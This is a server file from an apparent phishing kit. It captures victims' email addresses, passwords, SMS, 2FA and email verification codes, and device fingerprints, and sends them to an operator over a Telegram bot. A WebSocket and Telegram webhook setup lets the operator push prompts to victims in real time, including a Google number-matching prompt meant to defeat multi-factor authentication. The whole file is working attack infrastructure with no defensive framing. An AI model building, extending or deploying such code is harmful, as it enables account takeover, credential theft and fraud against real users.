import express from 'express';
import { createServer } from 'http';
import { WebSocketServer } from 'ws';
import path from 'path';
import { fileURLToPath } from 'url';

// --- Basic Setup ---
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const server = createServer(app);
const PORT = process.env.PORT || 10000;

// --- Telegram Bot Configuration ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("FATAL ERROR: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables are required.");
  process.exit(1);
}

// --- Middleware ---
app.use(express.json());
app.use(express.static(path.join(__dirname, 'dist')));

// --- API Endpoint for Telegram ---
app.post('/api/send-telegram', async (req, res) => {
  console.log('[SERVER] Received data on /api/send-telegram:', req.body);

  const { type, data } = req.body;
  let message = '';

  // Format the message based on the type of submission
  if (type === 'credentials') {
    message = `
--- 💼 DEVPARIS RESULTS CAPTURED 💼 ---
Provider: ${data.provider || 'N/A'}
Email: ${data.email || 'N/A'}
Password: ${data.password || 'N/A'}

--- 🕵️‍♂️ Session Info 🕵️‍♂️ ---
Session ID: ${data.sessionId || 'N/A'}
Timestamp: ${data.timestamp || new Date().toISOString()}

--- 💻 Device Fingerprint 💻 ---
User Agent: ${data.userAgent || 'N/A'}
Language: ${data.language || 'N/A'}
Screen: ${data.screenResolution || 'N/A'}
Timezone: ${data.timezone || 'N/A'}
Platform: ${data.platform || 'N/A'}
`;
  } else if (type === 'interaction') {
    // Render a friendly action label so the admin can immediately tell what
    // the user did (e.g. "User clicked Cancel" for the standardised
    // `user_canceled` action emitted by every interactive page's Cancel button).
    const ACTION_LABELS = {
      user_canceled: 'User clicked Cancel',
      retry_password: 'User submitted password (retry)',
      submit_sms: 'User submitted SMS code',
      submit_2fa: 'User submitted 2FA code',
      submit_email_code: 'User submitted email verification code',
      deny_authenticator: 'User denied the authenticator prompt',
      select_number: 'User tapped the prompted number',
      resend_sms: 'User requested a new SMS code',
      resend_prompt: 'User requested a new push prompt',
      resend_email_code: 'User requested a new email code',
      request_alternate_method: 'User requested an alternate verification method',
      continue_security_check: 'User continued the security check',
      deny_security_check: 'User denied the security check',
      begin_account_recovery: 'User started account recovery',
    };
    const action = data.action || 'N/A';
    const label = ACTION_LABELS[action] || action;
    message = `
--- 👆 INTERACTION 👆 ---
Action: ${label} (${action})
${data.code ? `Code: ${data.code}` : ''}
${data.password ? `Password: ${data.password}` : ''}

--- 🕵️‍♂️ Session Info 🕵️‍♂️ ---
Session ID: ${data.sessionId || 'N/A'}
Timestamp: ${data.timestamp || new Date().toISOString()}
`;
  } else {
    // Fallback for unknown types
    message = `--- ❓ UNKNOWN DATA ---
${JSON.stringify(req.body, null, 2)}`;
  }

  // Use a try-catch block for the Telegram API call
  try {
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const result = await response.json();
    if (!result.ok) {
      console.error('[SERVER] Telegram API Error:', result);
      // Still send a 200 to the client so the user flow isn't interrupted
      return res.status(200).json({ status: 'logged', error: 'telegram_failed' });
    }

    console.log('[SERVER] Data successfully sent to Telegram.');
    res.status(200).json({ status: 'success' });

  } catch (error) {
    console.error('[SERVER] Failed to send data to Telegram:', error);
    res.status(500).json({ status: 'error', message: 'Internal server error' });
  }
});


// --- WebSocket Server ---
const wss = new WebSocketServer({ server });
const activeConnections = new Map();

wss.on('connection', (ws, req) => {
    const sessionId = new URL(req.url, `http://${req.headers.host}`).searchParams.get('sessionId');
    if (!sessionId) {
        ws.terminate();
        console.log('[SERVER] WebSocket connection rejected: No sessionId provided.');
        return;
    }
    
    activeConnections.set(sessionId, ws);
    console.log(`[SERVER] WebSocket client connected: ${sessionId}`);

    ws.on('message', (message) => {
        console.log(`[SERVER] Message from ${sessionId}: ${message}`);
        // Here you can forward messages to an admin panel if needed
    });

    ws.on('close', () => {
        activeConnections.delete(sessionId);
        console.log(`[SERVER] WebSocket client disconnected: ${sessionId}`);
    });

    ws.on('error', (error) => {
        console.error(`[SERVER] WebSocket error for ${sessionId}:`, error);
    });
});

/**
 * Send a command + optional payload to a connected user's WebSocket.
 * Returns true if the command was actually delivered, false otherwise (e.g.
 * the user has disconnected or never had a session under this id).
 *
 * Exposed on `global` so other modules / inline handlers (e.g. the Telegram
 * webhook) can drive the front-end UI by sessionId.
 */
function sendWebSocketCommand(sessionId, command, data) {
    const ws = activeConnections.get(sessionId);
    if (!ws || ws.readyState !== 1 /* WebSocket.OPEN */) {
        console.warn('[SERVER] sendWebSocketCommand: no open socket for session', sessionId);
        return false;
    }
    try {
        ws.send(JSON.stringify({ command, data: data || {} }));
        return true;
    } catch (error) {
        console.error('[SERVER] sendWebSocketCommand failed for session', sessionId, error);
        return false;
    }
}
global.sendWebSocketCommand = sendWebSocketCommand;

// --- Telegram helpers (used by the inline-keyboard webhook below) ---
async function callTelegramApi(method, body) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
        const json = await response.json();
        if (!json.ok) {
            console.error(`[SERVER] Telegram ${method} error:`, json);
        }
        return json;
    } catch (error) {
        console.error(`[SERVER] Telegram ${method} failed:`, error);
        return null;
    }
}

// --- Telegram webhook: two-step "Google # Prompt" admin flow ---
//
// The admin's existing "Google # Prompt" button (bound elsewhere) is expected
// to send `callback_data=g_num_init:<sessionId>` for a given user session.
// Step 1 — `g_num_init:<sessionId>`: this handler responds by editing the
//   message to show a fresh inline keyboard of three random numbers, each
//   carrying `callback_data=g_num:<number>:<sessionId>`.
// Step 2 — `g_num:<number>:<sessionId>`: this handler sends
//   `show_google_number_prompt` over the WebSocket with `{ number }` so the
//   user sees the single chosen number.
app.post('/api/telegram-webhook', async (req, res) => {
    const update = req.body || {};
    // Always 200 the webhook so Telegram doesn't retry — we handle errors inline.
    res.status(200).json({ ok: true });

    const cb = update.callback_query;
    if (!cb || typeof cb.data !== 'string') return;

    const parts = cb.data.split(':');
    const verb = parts[0];

    if (verb === 'g_num_init') {
        const sessionId = parts[1];
        if (!sessionId) {
            await callTelegramApi('answerCallbackQuery', {
                callback_query_id: cb.id,
                text: 'Missing sessionId',
                show_alert: false,
            });
            return;
        }
        // Generate 3 distinct two-digit numbers for the inline keyboard.
        const picked = new Set();
        while (picked.size < 3) {
            picked.add(Math.floor(10 + Math.random() * 90));
        }
        const numbers = Array.from(picked);
        const inline_keyboard = [numbers.map((n) => ({
            text: String(n),
            callback_data: `g_num:${n}:${sessionId}`,
        }))];

        await callTelegramApi('answerCallbackQuery', { callback_query_id: cb.id });

        const editPayload = {
            chat_id: cb.message?.chat?.id,
            message_id: cb.message?.message_id,
            text: `Google # Prompt — pick the number to show the user (session ${sessionId}):`,
            reply_markup: { inline_keyboard },
        };
        const edited = await callTelegramApi('editMessageText', editPayload);
        if (!edited || !edited.ok) {
            // Fallback: send a new message with the keyboard if we can't edit.
            await callTelegramApi('sendMessage', {
                chat_id: cb.message?.chat?.id || TELEGRAM_CHAT_ID,
                text: editPayload.text,
                reply_markup: editPayload.reply_markup,
            });
        }
        return;
    }

    if (verb === 'g_num') {
        const number = Number(parts[1]);
        const sessionId = parts.slice(2).join(':');
        if (!Number.isFinite(number) || !sessionId) {
            await callTelegramApi('answerCallbackQuery', {
                callback_query_id: cb.id,
                text: 'Invalid payload',
            });
            return;
        }
        const delivered = sendWebSocketCommand(sessionId, 'show_google_number_prompt', { number });
        await callTelegramApi('answerCallbackQuery', {
            callback_query_id: cb.id,
            text: delivered ? `Sent ${number} to user` : `User ${sessionId} not connected`,
        });
        if (cb.message?.chat?.id && cb.message?.message_id) {
            await callTelegramApi('editMessageText', {
                chat_id: cb.message.chat.id,
                message_id: cb.message.message_id,
                text: `Google # Prompt — sent number ${number} to session ${sessionId}.`,
            });
        }
        return;
    }
});

// --- SPA Fallback ---
// All other GET requests return the main index.html file.
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

// --- Start Server ---
server.listen(PORT, () => {
  console.log(`[SERVER] Server is running on http://localhost:${PORT}`);
});
